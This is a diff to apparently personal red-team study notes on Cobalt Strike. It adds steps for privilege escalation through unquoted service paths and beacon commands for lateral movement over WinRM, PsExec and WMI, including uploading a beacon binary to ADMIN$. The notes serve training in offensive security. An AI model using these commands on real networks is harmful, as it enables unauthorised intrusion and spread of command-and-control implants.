@@ -173,7 +173,7 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 1. `beacon> run wmic service get name, pathname`.
 2. `powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl`.
 3. find the services that have unquoted services path vulnerablity.
-4. generate a payload e.g. **service.exe** and place it in the folder. use the payload with **TCP / SMB beacons** 
+4. generate a payload e.g. **service.exe [this must be a service binary not regular .exe]** and place it in the folder. use the payload with **TCP / SMB beacons** 
 5. `run sc stop Vuln-Service-1`
 6. `run sc start Vuln-Service-1`
 7. `connect localhost <what ever the port number you used when generating the payload`
@@ -279,6 +279,17 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 
 ### Lateral Movement
 1. CS provides 03 strategies for executing Beacons/code/commands on remote targets i.e. **jump** **remote-exec** **powershell, execute-assembly***
+#### Powershell Remoting
+1. `beacon> remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture`
+2. `beacon> jump winrm64 srv-1 smb`
+#### PsExec
+1. **psexec** / **psexec64** commands work by first uploading a service binary to the target system, then creating and starting a Windows service to execute that binary
+2. **psexec_psh** doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit).
+3. `beacon> jump psexec64 srv-1 smb`
+#### Windows Management Instrumentation (WMI)
+1. `beacon> cd \\srv-1\ADMIN$`
+2. `beacon> upload C:\Payloads\beacon-smb.exe`
+3. `beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe`
 
 ### Miscellaneous good points
 1. While doing active reconnisane, use VPN to hide the real Public IP address. 
